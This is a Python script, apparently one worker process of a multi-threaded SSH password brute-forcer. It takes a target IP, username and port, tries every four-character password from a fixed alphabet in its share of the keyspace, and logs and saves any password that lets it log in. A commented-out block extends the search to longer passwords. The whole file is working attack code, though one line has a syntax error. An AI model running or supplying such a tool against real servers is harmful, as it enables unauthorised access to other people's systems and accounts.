#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import subprocess
import time
import piSSH

def log(string):
    f = open('log.txt','a')
    f.write(string)
    f.close()
    
IP = sys.argv[2]
NAME = sys.argv[3]
PORT = sys.argv[4]
pword = ''

client = piSSH.client(ip = IP, port = PORT, name = NAME, printInfo = False)

try:
    if(int(sys.argv[1]) > 3 or int(sys.argv[1]) < 1):
            log("Uncorrected value")
    else:
            COUNTTHREADS = int(sys.argv[1])
except:
    log("Uncorrected type of arguments")

log('Second thread was started at %s !!!' % time.asctime(time.localtime(time.time())))

a  = ('e','t','a','o','i','n','s','h','r',
                'd','l','c','u','m','w','f','g','y',
                'p','b','v','k','j','x','q','z','1',
                '2','3','4','5','6','7','8','9','0',
                '_','-'     
            )

def check():
    f = open('break.txt','r')
    breaking = f.read().split()
    f.close()
    try:
        if(breaking[0]=="False"):
            return False
        else:
            return True
    except:
        return True

def end():
    print('Second thread find PASSWORD: %s ' % pword)
    log('Second thread find PASSWORD: %s ' % pword)
    f = open('break.txt','w')
    f.write('True')
    f.close()
    f = open('temp.txt','w')
    f.write(pword)
    f.close() 

for b in range((len(a)//COUNTTHREADS)+1,((len(a)//COUNTTHREADS)+1)*2):
    #print(b)
    if(not check()):
        for c in range(len(a)):
            if(not check()):
                for d in range(len(a)):
                    if(not check()):
                        for e in range(len(a)):
                            if(not check()):
                                pword = str(a[b])+str(a[c])+str(a[d])+str(a[e])
                                if(client.connecting(AutoAddPolicy = True, password = pword, returnInfo = True, printInfo = False):
                                    end()
                            '''
                            if(not check()):
                                for f in range(len(a)):
                                    if(not check()):
                                        for g in range(len(a)):
                                            if(not check()):
                                                for h in range(len(a)):
                                                    if((str(a[b])+str(a[c])+str(a[d])+str(a[e])+str(a[f])+str(a[g])+str(a[h]))==PASSWORD):
                                                        end()
                                                    '   
                                                        if(not check()):
                                                            for i in range(len(a)):
                                                                if((str(a[b])+str(a[c])+str(a[d])+str(a[e])+str(a[f])+str(a[g])+str(a[h])+str(a[i]))==res):
                                                                    print(res)
                                                                    end()
                                                                if(not check()):
                                                                    for j in range(len(a)):
                                                                        if((str(a[b])+str(a[c])+str(a[d])+str(a[e])+str(a[f])+str(a[g])+str(a[h])+str(a[i])+str(a[j]))==res):
                                                                           print(res)
                                                                           end()
'''
log('Second thread was stoped at %s !!!' % time.asctime(time.localtime(time.time())))
